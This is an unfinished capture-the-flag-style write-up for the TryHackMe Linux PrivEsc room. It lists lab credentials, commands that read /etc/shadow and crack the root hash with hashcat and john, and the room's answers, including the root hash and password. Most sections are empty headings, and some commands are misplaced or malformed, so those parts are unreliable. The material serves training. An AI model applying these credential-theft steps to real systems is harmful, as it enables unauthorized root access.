![Windows PrivEsc Banner](https://i.imgur.com/RuMC2vG.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Cover.png" alt="Linux PrivEsc Logo">
</p>

# Linux PrivEsc

This guide contains the answer and steps necessary to get to them for the [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) room.

## Table of contents

- [Deploy the Vulnerable Debian VM](#deploy-the-vulnerable-debian-vm)
- [Service Exploits](#service-exploits)
- [Weak File Permissions - Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)
- [Weak File Permissions - Writable /etc/passwd](#weak-file-permissions---writable-etcshadow)
- [Sudo - Shell Escape Sequences](#sudo---shell-escape-sequences)
- [Sudo - Environment Variables](#sudo---environment-variables)
- [Cron Jobs - File Permissions](#cron-jobs---file-permissions)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [SUID / SGID Executables - Known Exploits](#suid--sgid-executables---known-exploits)
- [SUID / SGID Executables - Shared Object Injection](#suid--sgid-executables---shared-object-injection)
- [SUID / SGID Executables - Environment Variables](#suid--sgid-executables---environment-variables)
- [SUID / SGID Executables - Abusing Shell Features (#1)](#suid--sgid-executables---abusing-shell-features-1)
- [SUID / SGID Executables - Abusing Shell Features (#2)](#suid--sgid-executables---abusing-shell-features-2)
- [Passwords & Keys - History Files](#passwords--keys---history-files)
- [Passwords & Keys - Config Files](#passwords--keys---config-files)
- [Passwords & Keys - SSH Keys](#passwords--keys---ssh-keys)
- [NFS](#nfs)
- [Kernel Exploits](#kernel-exploits)
- [Privilege Escalation Scripts ](#privilege-escalation-scripts)

### Deploy the Vulnerable Debian VM

**Username:** user

**Password:** password321

https://www.exploit-db.com/exploits/1518

### Service Exploits

ssh user@10.10.42.225
ls -lh /etc/shadow
cat /etc/shadow
su -u root
hashcat -m 1800 password.hash /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt password.hash


1. What is the root user's password hash?

   

   ><details><summary>Click for answer</summary>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</details>

2. What hashing algorithm was used to produce the root user's password hash?

   

   ><details><summary>Click for answer</summary>sha512crypt</details>

3. What is the root user's password?

   

   ><details><summary>Click for answer</summary>password123</details>

### Weak File Permissions - Readable /etc/shadow
### Weak File Permissions - Writable /etc/shadow
### Weak File Permissions - Writable /etc/passwd
### Sudo - Shell Escape Sequences
### Sudo - Environment Variables
### Cron Jobs - File Permissions
### Cron Jobs - PATH Environment Variable
### Cron Jobs - Wildcards
### SUID / SGID Executables - Known Exploits
### SUID / SGID Executables - Shared Object Injection
### SUID / SGID Executables - Environment Variables
### SUID / SGID Executables - Abusing Shell Features (#1)
### SUID / SGID Executables - Abusing Shell Features (#2)
### Passwords & Keys - History Files
### Passwords & Keys - Config Files
### Passwords & Keys - SSH Keys
### NFS
### Kernel Exploits
### Privilege Escalation Scripts 
